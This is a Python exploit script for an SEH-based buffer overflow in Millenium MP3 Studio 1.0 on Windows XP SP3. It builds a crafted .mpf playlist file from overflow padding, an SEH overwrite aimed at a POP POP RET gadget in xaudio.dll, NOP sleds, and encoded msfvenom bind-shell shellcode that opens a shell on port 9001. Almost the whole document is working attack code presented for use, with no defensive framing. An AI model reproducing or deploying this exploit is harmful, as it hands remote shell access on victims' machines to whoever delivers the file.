# Exploit for Millenium MP3 Studio 1.0 - SEH
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python

file = open("exploit.mpf", "wb")

# POP POP RET address in xaudio.dll = 0x10014e98
# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0d\x1a" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xdb\xd6\xd9\x74\x24\xf4\xbe\xa8\xce\xc8"
shellcode_bind += b"\x1b\x5a\x31\xc9\xb1\x53\x83\xea\xfc\x31"
shellcode_bind += b"\x72\x13\x03\xda\xdd\x2a\xee\xe6\x0a\x28"
shellcode_bind += b"\x11\x16\xcb\x4d\x9b\xf3\xfa\x4d\xff\x70"
shellcode_bind += b"\xac\x7d\x8b\xd4\x41\xf5\xd9\xcc\xd2\x7b"
shellcode_bind += b"\xf6\xe3\x53\x31\x20\xca\x64\x6a\x10\x4d"
shellcode_bind += b"\xe7\x71\x45\xad\xd6\xb9\x98\xac\x1f\xa7"
shellcode_bind += b"\x51\xfc\xc8\xa3\xc4\x10\x7c\xf9\xd4\x9b"
shellcode_bind += b"\xce\xef\x5c\x78\x86\x0e\x4c\x2f\x9c\x48"
shellcode_bind += b"\x4e\xce\x71\xe1\xc7\xc8\x96\xcc\x9e\x63"
shellcode_bind += b"\x6c\xba\x20\xa5\xbc\x43\x8e\x88\x70\xb6"
shellcode_bind += b"\xce\xcd\xb7\x29\xa5\x27\xc4\xd4\xbe\xfc"
shellcode_bind += b"\xb6\x02\x4a\xe6\x11\xc0\xec\xc2\xa0\x05"
shellcode_bind += b"\x6a\x81\xaf\xe2\xf8\xcd\xb3\xf5\x2d\x66"
shellcode_bind += b"\xcf\x7e\xd0\xa8\x59\xc4\xf7\x6c\x01\x9e"
shellcode_bind += b"\x96\x35\xef\x71\xa6\x25\x50\x2d\x02\x2e"
shellcode_bind += b"\x7d\x3a\x3f\x6d\xea\x8f\x72\x8d\xea\x87"
shellcode_bind += b"\x05\xfe\xd8\x08\xbe\x68\x51\xc0\x18\x6f"
shellcode_bind += b"\x96\xfb\xdd\xff\x69\x04\x1e\xd6\xad\x50"
shellcode_bind += b"\x4e\x40\x07\xd9\x05\x90\xa8\x0c\xb3\x98"
shellcode_bind += b"\x0f\xff\xa6\x65\xef\xaf\x66\xc5\x98\xa5"
shellcode_bind += b"\x68\x3a\xb8\xc5\xa2\x53\x51\x38\x4d\x78"
shellcode_bind += b"\x8b\xb5\xab\x14\xdb\x93\x64\x80\x19\xc0"
shellcode_bind += b"\xbc\x37\x61\x22\x95\xdf\x2a\x24\x22\xe0"
shellcode_bind += b"\xaa\x62\x04\x76\x21\x61\x90\x67\x36\xac"
shellcode_bind += b"\xb0\xf0\xa1\x3a\x51\xb3\x50\x3a\x78\x23"
shellcode_bind += b"\xf0\xa9\xe7\xb3\x7f\xd2\xbf\xe4\x28\x24"
shellcode_bind += b"\xb6\x60\xc5\x1f\x60\x96\x14\xf9\x4b\x12"
shellcode_bind += b"\xc3\x3a\x55\x9b\x86\x07\x71\x8b\x5e\x87"
shellcode_bind += b"\x3d\xff\x0e\xde\xeb\xa9\xe8\x88\x5d\x03"
shellcode_bind += b"\xa3\x67\x34\xc3\x32\x44\x87\x95\x3a\x81"
shellcode_bind += b"\x71\x79\x8a\x7c\xc4\x86\x23\xe9\xc0\xff"
shellcode_bind += b"\x59\x89\x2f\x2a\xda\xa9\xcd\xfe\x17\x42"
shellcode_bind += b"\x48\x6b\x9a\x0f\x6b\x46\xd9\x29\xe8\x62"
shellcode_bind += b"\xa2\xcd\xf0\x07\xa7\x8a\xb6\xf4\xd5\x83"
shellcode_bind += b"\x52\xfa\x4a\xa3\x76"

nops = "\x90" * 30
inc_esp = "\x44"

buffer = "A" * 4112 + "\x4c\x73\x1b\x41\x98\x4e\x01\x10" + nops + inc_esp + shellcode_bind + nops + "C" * (5000-4112-8-len(shellcode_bind)-len(2*nops))

file.write(buffer)
file.close()
